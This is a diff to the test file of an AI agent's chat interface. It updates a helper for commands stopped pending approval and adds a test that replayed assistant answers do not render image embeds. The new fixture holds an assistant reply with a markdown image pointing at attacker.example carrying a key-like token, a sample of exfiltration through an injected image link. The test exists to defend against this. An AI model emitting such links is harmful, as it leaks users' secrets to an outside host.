@@ -692,10 +692,10 @@ def test_a_host_shell_is_an_error_not_a_caption(monkeypatch, tmp_path):
 
 def _stop_for_approval(app, command: str = "git push origin main"):
     """Put the session in the state a stopped command leaves behind."""
-    from mcp_agent.approvals import PendingApproval
+    from mcp_agent.approvals import PendingApproval, StoppedAction
 
     app.session_state[SESSION_KEY].pending_approval = PendingApproval(
-        tool_name="shell", command=command, args={"command": command}
+        actions=(StoppedAction(tool_name="shell", command=command, args={"command": command}),)
     )
     return app.run()
 
@@ -832,3 +832,25 @@ def test_a_resume_that_fails_leaves_the_decision_on_offer(monkeypatch):
     app = _click(app, "Approve")
 
     assert app.session_state[SESSION_KEY].pending_approval is not None
+
+
+def test_replayed_answers_do_not_fetch_images(monkeypatch):
+    """A transcript is redrawn on every rerun, so an embed fetches every time.
+
+    Measured: filtering the streaming path but not the replay left every other
+    test green, and the replay is the path that repeats.
+    """
+    app = run_app(monkeypatch)
+    app.session_state[SESSION_KEY].history = [
+        {"role": "user", "content": "summarise that page"},
+        {
+            "role": "assistant",
+            "content": "Done. ![](https://attacker.example/?k=sk-ant-leak)",
+            "tool_log": "",
+        },
+    ]
+    app = app.run()
+
+    drawn = " ".join(block.value for block in app.markdown)
+    assert "attacker.example" not in drawn, drawn
+    assert "Done." in drawn
